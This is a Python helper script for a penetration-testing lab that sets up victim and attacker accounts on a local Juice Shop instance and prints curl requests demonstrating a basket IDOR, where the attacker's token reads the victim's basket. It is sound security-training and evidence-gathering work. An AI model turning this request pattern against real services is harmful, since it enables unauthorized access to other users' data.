#!/usr/bin/env python3
"""Set up the two throwaway accounts used for the manual Broken Access
Control demonstration (basket IDOR), and print the exact requests to run
through Burp's proxy.

This script only creates accounts and prints instructions. It does not
send the demonstration requests itself, because the point of this step is
that a human (or Burp's Repeater) sends them through Burp's proxy so they
land in Burp's own HTTP history as real evidence. See
evidence/burp/basket-idor-notes.md for what was actually observed.

Only ever targets the local Juice Shop container.
"""
import sys

import requests

BASE = "http://127.0.0.1:3000"
VICTIM = ("burp-victim@example.test", "VictimPass1!")
ATTACKER = ("burp-attacker@example.test", "AttackerPass1!")


def register_and_login(email: str, password: str) -> dict:
    requests.post(
        f"{BASE}/api/Users",
        json={"email": email, "password": password, "passwordRepeat": password},
        timeout=10,
    )
    r = requests.post(f"{BASE}/rest/user/login", json={"email": email, "password": password}, timeout=10)
    r.raise_for_status()
    return r.json()["authentication"]


def main() -> int:
    if not BASE.startswith("http://127.0.0.1:3000"):
        print("refusing: target is not the local container", file=sys.stderr)
        return 1

    victim = register_and_login(*VICTIM)
    attacker = register_and_login(*ATTACKER)

    victim_basket = victim["bid"]
    attacker_basket = attacker["bid"]

    print(f"victim account: {VICTIM[0]}, basket id {victim_basket}")
    print(f"attacker account: {ATTACKER[0]}, basket id {attacker_basket}")
    print()
    print("Send these two requests through Burp's proxy (127.0.0.1:8080):")
    print()
    print(f"  curl -x http://127.0.0.1:8080 {BASE}/rest/basket/{victim_basket} \\")
    print(f'    -H "Authorization: Bearer {victim["token"]}"')
    print("  (baseline: victim reads their own basket, should succeed)")
    print()
    print(f"  curl -x http://127.0.0.1:8080 {BASE}/rest/basket/{victim_basket} \\")
    print(f'    -H "Authorization: Bearer {attacker["token"]}"')
    print("  (the finding: attacker's own valid token reads the victim's basket)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
